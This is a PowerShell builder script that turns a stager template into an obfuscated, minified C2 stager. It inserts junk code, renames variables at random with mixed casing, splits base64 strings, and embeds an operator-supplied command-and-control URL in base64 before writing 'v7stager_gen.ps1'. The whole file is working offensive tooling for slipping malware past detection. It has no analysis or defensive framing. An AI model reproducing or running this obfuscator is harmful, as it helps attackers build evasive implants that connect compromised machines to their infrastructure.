# randomise split count
# more junk code
# minify output

# Common PowerShell reserved words and built-in commands
$reserved = @(
    'if','else','elseif','for','foreach','while','do','switch','function','return','break','continue',
    'param','begin','process','end','in','not','and','or','xor','eq','ne','gt','lt','ge','le',
    'true','false','null','try','catch','finally','throw','trap','data','dynamicparam','filter',
    'workflow','configuration','class','enum','using','var','new','exit','default','define','from',
    # Common built-in cmdlets/aliases
    'Get-Command','Get-Help','Write-Host','Write-Output','Set-Content','Get-Content','Invoke-Expression',
    'Invoke-RestMethod','Invoke-WebRequest','Select-Object','Out-String','ConvertTo-Json','Get-Random'
)

function Get-RandomName($usedNames) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    do {
        $name = -join (1..(Get-Random -Minimum 2 -Maximum 6) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
    } while ($usedNames -contains $name -or $reserved -contains $name)
    return $name
}

function Encode-Base64($str) {
    [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($str))
}

function Get-RandomCase($str) {
    ($str.ToCharArray() | ForEach-Object {
        if (Get-Random -Minimum 0 -Maximum 2) { $_.ToString().ToUpper() } else { $_.ToString().ToLower() }
    }) -join ''
}
function Get-JunkCode {
    $junkTemplates = @(
        '$null = [System.Guid]::NewGuid().ToString()',
        '$junkVar{0} = Get-Random',
        'function junkFunc{0}{{return {1}}}',
        'if ($false) {{ Write-Host "Junk{0}" }}',
        '$junkArr{0} = @(1,2,3,4,5)',
        '# Junk comment {0}'
    )
    $n = Get-Random -Minimum 1000 -Maximum 9999
    $junk = $junkTemplates | Get-Random
    if ($junk -like '*{1}*') {
        $junk = $junk -f $n, (Get-Random -Minimum 100 -Maximum 999)
    } else {
        $junk = $junk -f $n
    }
    return $junk
}
function Split-Base64String($b64) {
    if ($b64.Length -le 10) { return "`"$b64`"" }
    $numParts = Get-Random -Minimum 2 -Maximum 5
    $indices = @()
    for ($i = 1; $i -lt $numParts; $i++) {
        $indices += Get-Random -Minimum 1 -Maximum ($b64.Length - 1)
    }
    $indices = ($indices | Sort-Object)
    $parts = @()
    $last = 0
    foreach ($idx in $indices) {
        $parts += $b64.Substring($last, $idx - $last)
        $last = $idx
    }
    $parts += $b64.Substring($last)
    return '(' + ($parts | ForEach-Object { "`"$_`"" }) -join ' + ' + ')'
}

# Read template
$templatePath = ".\v7template(compressed).ps1"
$template = Get-Content $templatePath -Raw

# Split into statements (lines that end with ';' or are blank)
$lines = $template -split "(`r?`n)+"
$insertablePositions = @(0..($lines.Count-1)) | Where-Object { $lines[$_] -notmatch '^\s*#' } # avoid comments

$junkCount = Get-Random -Minimum 3 -Maximum 7
for ($i = 0; $i -lt $junkCount; $i++) {
    $pos = $insertablePositions | Get-Random
    $lines = $lines[0..$pos] + @(Get-JunkCode) + $lines[($pos+1)..($lines.Count-1)]
}
$template = $lines -join "`r`n"



$passes = 3
for ($i = 0; $i -lt $passes; $i++) {
    # Generate new random names for each pass
    $usedNames = @()
    $names = @{}
    foreach ($key in @(
        'g9q','z1r','x2y','y7t','r4d','h1','uA','hD','regB','A1','p1','b2','r2','cM','rS','rB'
    )) {
        $randName = Get-RandomName $usedNames
        $names[$key] = $randName
        $usedNames += $randName
    }
    $keys = @($names.Keys)
    foreach ($k in $keys) {
        $names[$k] = Get-RandomCase $names[$k]
    }
        
    foreach ($k in $names.Keys) {
        if ($k -eq 'd1') { continue }
        $template = $template -replace "\b$k\b", $names[$k]
    }
}

# Replace variable/function names in template
foreach ($k in $names.Keys) {
    # Skip device_id/d1 so it stays as device_id in the output
    if ($k -eq 'd1') { continue }
    $template = $template -replace "\b$k\b", $names[$k]
}

# Fix: Ensure User-Agent is always a function call
$userAgentPattern = '(("User-Agent"\s*=\s*)(\w+))(\s*[,}])'
$template = [regex]::Replace(
    $template,
    $userAgentPattern,
    { param($m) "$($m.Groups[2].Value)$($m.Groups[3].Value)()$($m.Groups[4].Value)" }
)

$pattern = "$($names.g9q)\s*""([A-Za-z0-9\+/=]+)"""
$matches1 = [regex]::Matches($template, $pattern)
foreach ($match in $matches1) {
    $full = $match.Value
    $b64 = $match.Groups[1].Value
    $split = Split-Base64String $b64
    $replacement = "$($names.g9q) $split"
    $template = $template -replace [regex]::Escape($full), $replacement
}

# Prompt for new C2 URL and replace the C2 URL assignment
$newC2 = Read-Host "Enter C2 URL (e.g. https://yourc2.com:443)"
$newC2b64 = Encode-Base64 $newC2


$c2Pattern = "(\$\w+\s*=\s*$($names.g9q)\s*)""[^""]+"""
$c2Match = [regex]::Match($template, $c2Pattern)
if ($c2Match.Success) {
    $before = $c2Match.Groups[1].Value
    $template = $template -replace [regex]::Escape($c2Match.Value), "$before`"$newC2b64`""
}



# Output to file
$outPath = ".\v7stager_gen.ps1"
$lines = $template -split "`r?`n"
$minified = $lines | Where-Object { $_ -notmatch '^\s*#' -and $_.Trim() -ne '' } |
    ForEach-Object { $_.Trim() }
$template = ($minified -join ';')
Set-Content -Path $outPath -Value $template

Write-Host "Generated stager saved to $outPath"